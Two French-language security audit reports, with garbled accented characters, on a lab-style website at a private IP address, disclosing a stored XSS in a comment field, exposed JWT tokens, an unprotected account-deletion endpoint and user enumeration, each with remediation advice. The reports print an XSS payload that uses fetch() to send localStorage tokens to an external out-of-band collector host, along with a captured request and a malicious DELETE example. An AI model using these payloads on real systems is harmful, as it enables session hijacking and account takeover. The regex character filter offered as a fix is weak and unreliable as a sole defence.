# ğŸ”’ Rapport dâ€™Audit CybersÃ©curitÃ© â€” VulnÃ©rabilitÃ© XSS

### ğŸ¯ Cible :
Site web â€” http://10.33.70.223:8000/

### ğŸ“… Date de lâ€™audit :
06/12/2025

### ğŸ‘¨â€ğŸ’» Auditeur :
LaDÃ©bauche

## 1. ğŸ“‹ Contexte
Dans le cadre dâ€™un audit de sÃ©curitÃ©, nous avons testÃ© toutes les zones de saisie utilisateur du site, notamment le champ commentaire sur les stations. Lâ€™objectif Ã©tait de dÃ©tecter la prÃ©sence de vulnÃ©rabilitÃ©s de type Cross-Site Scripting (XSS).

## 2. âš ï¸ Description de la vulnÃ©rabilitÃ©
### Type :
Cross-Site Scripting (XSS) stockÃ©

###Â Localisation :
Champ commentaire sur les stations

###Â DÃ©tails :
Le champ commentaire nâ€™Ã©chappe pas ni ne filtre correctement les entrÃ©es. Il est possible dâ€™injecter du code JavaScript qui sera exÃ©cutÃ© sur les navigateurs des visiteurs, ce qui constitue un risque majeur.

##Â 3. ğŸ§ª Tests rÃ©alisÃ©s
### Test 1 : injection simple
Payload injectÃ© :
```
<script>alert(1)</script>
```
RÃ©sultat :
Une alerte sâ€™affiche immÃ©diatement dans le navigateur â†’ preuve que le XSS est exploitable.

### Test 2 : vol de donnÃ©es via XSS
Payload injectÃ© :
```
<script>
fetch("http://d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro/capture?ls=" + JSON.stringify(localStorage))
</script>
```
RÃ©sultat :
Le script vole le contenu complet du localStorage, incluant notamment des tokens dâ€™authentification, et lâ€™envoie vers un serveur externe contrÃ´lÃ© par lâ€™attaquant.

Exemple de requÃªte interceptÃ©e :
```bash
GET /capture?ls={"auth_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","auth_user":"{\"id\":\"683d6f786e7170f60e39139e\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"}
Host: d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro

```

## 4. ğŸ’¥ Impact

ğŸš¨ Vol des donnÃ©es sensibles (tokens, identifiantsâ€¦)

ğŸ”“ Prise de contrÃ´le possible des comptes utilisateurs

ğŸ¦  Propagation de scripts malveillants (keylogger, redirection, etc.)

ğŸ“‰ Perte de confiance des utilisateurs, risques lÃ©gaux


## 5. ğŸ› ï¸ Recommandations & RÃ©mÃ©diations

### 5.1 Validation stricte via regex pour le champ commentaire
EmpÃªcher lâ€™injection de caractÃ¨res spÃ©ciaux utilisÃ©s dans XSS :
```
[<>{}()"'/;]
```
Ce filtre bloque les caractÃ¨res < > { } ( ) " ' / ; qui servent Ã  construire des balises ou scripts malveillants.

### 5.2 Assainissement cÃ´tÃ© serveur
Nettoyer et encoder les entrÃ©es avant affichage.

Utiliser des fonctions dâ€™Ã©chappement HTML standards.

### 5.3 Mise en place dâ€™une Content Security Policy (CSP)
Limiter les sources de scripts autorisÃ©es pour empÃªcher lâ€™exÃ©cution de scripts externes ou injectÃ©s.

### 5.4 Validation cÃ´tÃ© client (optionnelle mais recommandÃ©e)
AmÃ©liorer lâ€™expÃ©rience utilisateur en dÃ©tectant les erreurs avant lâ€™envoi.

## 6. âœ… Conclusion
La faille XSS dÃ©tectÃ©e est critique et doit Ãªtre corrigÃ©e rapidement pour protÃ©ger les utilisateurs et prÃ©server lâ€™intÃ©gritÃ© du site. Lâ€™implÃ©mentation dâ€™un filtrage rigoureux, couplÃ©e Ã  une politique CSP, est indispensable.



# ğŸ”’ Rapport dâ€™Audit CybersÃ©curitÃ© â€” VulnÃ©rabilitÃ©s XSS & API

## ğŸ‘¥ Ã‰quipe : LaDÃ©bauche

## ğŸ“… Date : 06/12/2025

## ğŸŒ Cible : http://10.33.70.223:8000/

## 1. ğŸ“‹ Contexte
Dans le cadre de notre audit de sÃ©curitÃ©, nous avons analysÃ© le site Ã  travers les diffÃ©rents points d'entrÃ©e utilisateur. Nos investigations se sont concentrÃ©es sur :

ğŸ—¨ï¸ les champs de commentaires

ğŸ” les requÃªtes et endpoints de lâ€™API

ğŸ” la gestion de lâ€™authentification et des tokens

## 2. âš ï¸ VulnÃ©rabilitÃ©s identifiÃ©es
### 2.1 ğŸ’¥ VulnÃ©rabilitÃ© XSS (Cross-Site Scripting)
ğŸ“ Localisation : champ commentaire des stations
ğŸ§ª Payload testÃ© :
```bash
<script>alert(1)</script>
```
et
```bash
<script>
fetch("http://d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro/capture?ls=" + JSON.stringify(localStorage))
</script>
```

## ğŸ“¦ DonnÃ©es exfiltrÃ©es :
```bash
{
  "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "auth_user": "{\"id\":\"683d6f78...\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"
}
```

## ğŸ¯ Impact :
Vol du localStorage, y compris du token JWT âš ï¸

Prise de contrÃ´le de session utilisateur

Injection de scripts malveillants pour d'autres utilisateurs

## âœ… Recommandations :
Ã‰chapper les caractÃ¨res spÃ©ciaux via regex :
Exemple : ```r'[<>{}()"\'/;]'```

Utiliser des librairies de sanitisation cÃ´tÃ© back-end (DOMPurify, bleach, etc.)

Appliquer une Content-Security-Policy restrictive

### 2.2 ğŸ”“ Exploitation de lâ€™API : token manipulable
ğŸ“ DÃ©tail : Le token JWT peut Ãªtre rÃ©cupÃ©rÃ© via XSS ou interceptÃ© via session non sÃ©curisÃ©e (pas de HttpOnly). Ensuite, il est possible de :

ğŸ§¼ Supprimer le compte utilisateur en appelant une route /api/delete avec le token

ğŸ› ï¸ Modifier les donnÃ©es du profil via /api/update

ğŸ“¥ Exemple de requÃªte malveillante :

```bash
DELETE /api/delete_account
Authorization: Bearer <token_volÃ©>
```

ğŸ¯ Impact :
Suppression de comptes utilisateurs

Modification de donnÃ©es sensibles

Usurpation d'identitÃ© numÃ©rique

âœ… Recommandations :
Ajouter lâ€™attribut HttpOnly et Secure au cookie du token

ImplÃ©menter une vÃ©rification cÃ´tÃ© serveur :

IP ou user-agent liÃ©s au token

double vÃ©rification avant suppression

Ajouter une confirmation (mot de passe ou 2FA) avant suppression

### 2.3 ğŸ§  Enumeration des utilisateurs
ğŸ“ DÃ©tail : Le champ auth_user renvoyÃ© contient lâ€™email et nom de lâ€™utilisateur connectÃ©. Cela permet :

de deviner des noms dâ€™utilisateurs valides

de lancer des attaques de brute force sur /login

ğŸ“¥ Exemple de rÃ©ponse serveur :

```bash
{
  "auth_user": "{\"id\":\"683d6f...\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"
}
```
ğŸ¯ Impact :
Deviner les comptes existants

Tentatives massives de bruteforce sur les identifiants

Risque de compromission de comptes faibles

âœ… Recommandations :
Ne pas exposer les noms/emails via le client sans nÃ©cessitÃ©

ImplÃ©menter une stratÃ©gie anti-bruteforce :

limitation du nombre de tentatives (rate limiting)

dÃ©lai progressif

CAPTCHA

Sur /login, renvoyer un message neutre :

âŒ "Identifiants incorrects" (au lieu de prÃ©ciser si lâ€™email existe)

## 3. ğŸ› ï¸ SynthÃ¨se des Recommandations
ğŸ›‘ VulnÃ©rabilitÃ©	âœ… RemÃ©diation principale
XSS	Ã‰chapper/sanitiser le HTML + CSP
Token exposÃ© via XSS	HttpOnly, validation serveur, token liÃ© Ã  l'IP
Suppression API sans protection	Confirmation dâ€™action (mot de passe ou 2FA)
Enumeration utilisateur	Masquer infos, ajout CAPTCHA & rate limiting

## 4. âœ… Conclusion
Lâ€™audit a permis de mettre en Ã©vidence plusieurs vulnÃ©rabilitÃ©s critiques :

Une faille XSS exploitable Ã  distance

Une exposition du token dâ€™authentification

Un dÃ©faut de contrÃ´le sur les endpoints API sensibles

Une possibilitÃ© dâ€™Ã©numÃ©ration dâ€™utilisateurs et d'attaque par bruteforce

â¡ï¸ Une correction rapide est fortement recommandÃ©e pour Ã©viter un dÃ©tournement de comptes ou une perte de donnÃ©es utilisateurs.


